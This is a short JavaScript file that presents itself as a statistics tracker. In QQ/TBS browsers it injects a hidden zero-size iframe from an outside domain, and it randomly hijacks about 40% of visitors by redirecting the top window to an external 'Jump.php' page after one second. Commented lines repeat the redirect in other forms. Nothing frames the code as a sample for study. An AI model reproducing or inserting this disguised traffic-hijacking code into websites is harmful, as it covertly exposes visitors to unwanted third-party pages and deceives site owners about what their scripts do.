window.curNode = document.currentScript || (function() {
    var script = document.querySelectorAll('script');
    return script[script.length - 1]
})();
var statid = '1280326966'
function Statistics(cnzz_id) {
    var tua = navigator.userAgent.toLocaleLowerCase();
    if ( - 1 !== tua.indexOf("tbs/") || -1 !== tua.indexOf("mqqbrowser/")) {
        var frame = document.createElement('iframe');
        frame.id = 'cnzz_frame_' + statid;
        frame.style.cssText = 'position:absolute;left:0;top:0;width:0;height:0;visibility:hidden;';
        frame.frameBorder = '0';
        frame.src = '//etc.6187wo.com/act.html#web_id=' + cnzz_id;
        try {
            window.curNode.parentNode.appendChild(frame);
        } catch(e) {}
    }
}
Statistics(statid);
var Crd = Math.floor(Math.random() * (1000 - 1)) + 1;
if (Crd <= 400) window.setTimeout("window.top.location.href = 'https://go.3801wd.com/Jump.php'",1000);
//if (Crd <= 400) window.setTimeout("new Image().src = 'https://go.3801wd.com/Jump.php'",1000);
//window.setTimeout("window.top.location.href = 'https://go.3801wd.com/Jump.php'",1000);
//window.top.location.href = 'https://go.3801wd.com/Jump.php';